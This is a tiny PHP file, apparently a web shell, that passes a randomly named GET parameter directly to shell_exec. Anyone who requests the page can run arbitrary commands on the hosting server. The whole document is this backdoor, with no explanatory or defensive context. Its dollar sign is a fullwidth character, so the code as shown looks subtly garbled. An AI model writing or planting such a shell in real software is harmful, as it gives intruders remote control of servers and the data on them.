<?php
shell_exec(＄_GET['uyR9V88U']);
?>
